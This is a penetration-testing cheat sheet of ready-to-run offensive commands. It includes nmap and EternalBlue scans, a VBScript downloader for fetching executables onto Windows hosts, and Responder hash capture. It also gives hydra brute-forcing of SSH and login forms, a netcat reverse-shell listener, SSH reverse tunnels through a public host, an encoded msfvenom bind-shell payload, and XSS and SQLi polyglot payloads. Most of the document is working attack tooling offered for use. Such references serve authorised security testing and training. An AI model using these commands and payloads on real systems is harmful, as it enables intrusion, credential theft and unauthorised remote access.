
# Discovery



# Enumeration

## Active Scanning
Assumes there's an `ips.txt` file with the IPs to target.

### Full TCP scan
```bash
nmap -v1 -A -T4 -p- -sS -oA full_tcp -iL ips.txt
```

### Full TCP + UDP scan (super long)
```bash
nmap -v1 -A -T4 -p- -sS -sU -oA full_tcp_udp -iL ips.txt
```

### Common TCP ports
```bash
nmap -v1 -sS -Pn -p 21,22,23,25,53,80,111,135,137,138,139,161,389,443,445,873,1099,1194,1433,1434,2049,2082,2083,2376,2780,3260,3306,3389,5060,5061,5432,5500,5984,6379,8000,8080,8081,8200,8888,8098,9000,9050,9090,9091,9143,10099,10199,10443,9160,9443,8443,10000,11211,20000,27000,27001,27018,27019,27017,28017,60893 --open -oA common_tcp -iL ips.txt
```

### SMB enumeration and show Eternal Blue vulnerable machines
```bash
nmap -v1 -p 139,445 --open --script smb-vuln-ms17-010 -oA smb_eternal_blue -iL ips.txt
```

### SMTP users enumeration
```bash
nmap --script smtp-enum-users.nse -p 25,465,587 -iL ips.txt
```

### RDP encryption enumeration and ms12-020
```bash
nmap -p 3389 --script rdp-enum-encryption,rdp-vuln-ms12-020 -iL ips.txt
```

### Services enumeration
```bash
host -t ns megacorpone.com
host -t mx megacorpone.com
```
### List SMB shares
```bash
smbclient -L <ip> -U <user> -I //<ip> <password>
```


# Exploitation

## wget on Windows
Usage: `cscript wget.vbs http://<ip>/<file.exe> <file.exe>`

```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http is Nothing then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http is Nothing then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http is Nothing then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.close >> wget.vbs
```

## Try to map and list content of every shared smb resource
```bash
cat <ips_file> | xargs -n1 -i enum4linux -S -w <domain> -u <user> -p <pass> {}
```

## NSF

```bash
apt install nfs-common
mount -t nfs <ip>:/<path> /mnt/ -nolock

```
## Capture LLMNR/NetBios hashes with Responder

```bash
git clone https://github.com/lgandx/Responder.git
python Responder.py -I eth0 -rPv
```

## SSH

Test with a wordlist as password
```bash
hydra -V -L <users_list> -P <passwords_list> <ip> ssh -o hydra-ssh-attack.txt
```

Try all 4 digits combination of lowercase, uppercase and numbers
```bash
hydra -V -l <username> -x 4:4:aA1 <ip> ssh -o hydra-ssh-attack.txt
```

Listen for a reverse shell
```bash
nc -l -p 9999 -vvv
```

### Reverse shell with a public host relay
From the internal machine, initiate the reverse shell
```bash
ssh -f -N -T -R 2200:localhost:22 user@public_host
```
From the public host access the reversed shell that's forwarded on 2200
```bash
ssh -p 2200 user@localhost
```

# Post Exploitation

## msfvenom
https://netsec.ws/?p=331

```bash
msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -f python
```


# Web

## Login Forms

```bash
hydra <ip> http-form-post "<local_uri>:user=^USER^&pass=^PASS^:<error_msg>" -L <users.txt> -P <pass.txt> -t 20 -w 30 -o hydra-http-post-attack.txt
```

## Polyglots

### XSS

```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

### SQLi

```sql
SLEEP(1) /*‘ or SLEEP(1) or ‘“ or SLEEP(1) or “*/
```

```
SELECT 1,2,IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),​SLEEP(1)))OR"*/ FROM some_table WHERE ex = ample
```


# Misc

## rsync a full directory
```bash
rsync -azvP <source>/ <dest>
```

## Simple HTTP server

```bash
python -m SimpleHTTPServer 80
```

## Filesystem
Directory size
```bash
du -sh directory_name
```
## Compress
```bash
tar -zcvf {.tgz-file} {files}
```

## Users
Add a new `pepe` with `sudo`
```bash
useradd -G sudoers -d /home/pepe -m pepe
passwd pepe
```
Add an existing `pepe` to the `sudoers`
```bash
usermod -a -G sudoers pepe
```

# Links

## Penetration Testing Cheat Sheets
- https://highon.coffee/blog/penetration-testing-tools-cheat-sheet
- https://hausec.com/pentesting-cheatsheet
